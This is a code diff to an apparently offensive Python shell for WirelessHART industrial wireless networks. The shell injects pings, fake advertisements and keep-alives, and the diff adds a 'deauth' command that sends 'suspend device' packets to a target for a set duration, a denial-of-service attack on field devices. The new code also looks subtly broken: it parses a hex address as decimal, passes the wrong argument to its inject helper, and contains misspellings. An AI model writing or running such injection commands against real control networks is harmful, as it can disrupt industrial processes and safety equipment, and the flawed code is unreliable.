@@ -73,6 +73,7 @@ class WiHARTattackShell(CommandLineApp):
             finally:
                 self.dev.set_connector(self.sniffer)
 
+    # --- User interaction -----------------------------------
 
     def _toolbar(self):
         global last_pkt
@@ -98,6 +99,7 @@ class WiHARTattackShell(CommandLineApp):
             "ping": self._cmd_ping,
             "adv": self._cmd_adv,
             "ka": self._cmd_ka,
+            "deauth": self._cmd_deauth,
             "save": self._cmd_save,
         }
 
@@ -147,6 +149,7 @@ class WiHARTattackShell(CommandLineApp):
         print("  ping           inject a ping request (prompts for params)")
         print("  adv            inject a fake advertisement (prompts for params)")
         print("  ka             inject a keep-alive (prompts for target)")
+        print("  deauth         inject a suspend device packet")
         print("  save           save network configuration to a file")
         print("  exit / quit    leave")
 
@@ -200,12 +203,18 @@ class WiHARTattackShell(CommandLineApp):
         print(f"[*] Injecting keep-alive from 0x1 to {dst}...")
         self._inject(self.injector.send_keep_alive, 0x1, dst)
 
+    def _cmd_deauth(self, args):
+        dst = int(input("Packet detination (hex) >"))
+        duration= int(input("Suspend duration >"))
+        print("[*] Injecting suspend command...")
+        self._inject(self.injector.mass_de_authetication_packet(dst, duration))
+
     def _cmd_save(self, args):
         file = input("File name >")
         self.sniffer.save_network_state(file)
         print("[+] Network state saved")
 
-
+    # --- Main routine -----------------------------------------------------------
     def run(self):
         global last_pkt
         self.pre_run()
